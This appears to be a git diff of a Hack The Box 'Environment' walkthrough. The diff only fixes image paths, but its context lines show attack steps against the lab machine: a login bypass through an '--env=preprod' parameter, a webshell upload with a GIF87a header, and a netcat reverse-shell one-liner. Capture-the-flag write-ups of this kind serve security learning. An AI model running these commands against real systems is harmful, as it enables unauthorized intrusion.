@@ -3,9 +3,9 @@ title: Environment
 date: 2025-09-07
 categories: [HTB Walkthrough]
 tags: Linux Revershell SSH Web CVE
-img_path: assets/HTB/Environment/image.png
+img_path: /assets/HTB/Environment/image.png
 image:
-  path: assets/HTB/Environment/image.png
+  path: /assets/HTB/Environment/image.png
 ---
 
 <table style="width:100%; table-layout:fixed; text-align:center;">
@@ -21,7 +21,7 @@ image:
     <td>Medium</td>
     <td>Linux</td>
     <td>04 May 2025</td>
-    <td><img src="assets/HTB/Environment/image1.png" alt="Logo" width="80"></td>
+    <td><img src="/assets/HTB/Environment/image1.png" alt="Logo" width="80"></td>
   </tr>
 </table>
 
@@ -139,7 +139,7 @@ update `/etc/hosts`
 http://environment.htb/
 ```
 
-<img src="assets/HTB/Environment/image2.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image2.png" alt="Error Loading Image"/>
 
 ## Enumeration
 
@@ -184,13 +184,13 @@ Task Completed
 http://environment.htb/login
 ```
 
-<img src="assets/HTB/Environment/image4.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image4.png" alt="Error Loading Image"/>
 
 ```
 http://environment.htb/upload
 ```
 
-<img src="assets/HTB/Environment/image5.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image5.png" alt="Error Loading Image"/>
 
 
 
@@ -201,10 +201,10 @@ Now we log in with invalid credentials and intercept the request.
 http://environment.htb/login
 ```
 
-<img src="assets/HTB/Environment/image6.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image6.png" alt="Error Loading Image"/>
 
 
-<img src="assets/HTB/Environment/image7.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image7.png" alt="Error Loading Image"/>
 
 When I change the email variable from `email` to `email2` and forward the intercepted request, we see a code snippet due to an error caused by the invalid variable `email2`.
 
@@ -220,7 +220,7 @@ _token=.....&email2=hello%40gmail.com&password=hello&remember=False
 
 Forward it, and then forward the response again.
 
-<img src="assets/HTB/Environment/image8.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image8.png" alt="Error Loading Image"/>
 
 ```php
    }
@@ -253,13 +253,13 @@ _token=.........&email=hello%40gmail.com&password=hello&remember[0]=False
 
 
 
-<img src="assets/HTB/Environment/image9.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image9.png" alt="Error Loading Image"/>
 
 
 Forward forward
 
 
-<img src="assets/HTB/Environment/image10.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image10.png" alt="Error Loading Image"/>
 
 ```php
      $keep_loggedin = False;
@@ -297,19 +297,19 @@ to
 POST/login?--env=preprod
 ```
 
-<img src="assets/HTB/Environment/image11.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image11.png" alt="Error Loading Image"/>
 
 Forward the intercepted request a couple of times, and we are logged in.
 
 
-<img src="assets/HTB/Environment/image12.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image12.png" alt="Error Loading Image"/>
 
 
 In the profile page, we have an image upload functionality.
 
 
 
-<img src="assets/HTB/Environment/image13.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image13.png" alt="Error Loading Image"/>
 
 
 After trying different types of extensions, I finally found a way to upload a shell.
@@ -338,11 +338,11 @@ GIF87a
 </html>
 ```
 
-<img src="assets/HTB/Environment/image14.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image14.png" alt="Error Loading Image"/>
 
 In Burp, in the response of the POST/upload, we can see the path where the shell is uploaded.
 
-<img src="assets/HTB/Environment/image15.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image15.png" alt="Error Loading Image"/>
 
 
 ```
@@ -351,7 +351,7 @@ http://environment.htb/storage/files/file.php
 
 If it shows "File not found", upload the shell again.
 
-<img src="assets/HTB/Environment/image16.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image16.png" alt="Error Loading Image"/>
 
 ## Reverse Shell Access
 
@@ -366,7 +366,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.56 4444 >/tmp/f
 nc -lvnp 4444
 ```
 
-<img src="assets/HTB/Environment/image17.png" alt="Error Loading Image"/>
+<img src="/assets/HTB/Environment/image17.png" alt="Error Loading Image"/>
 
 
 To make the shell stable.
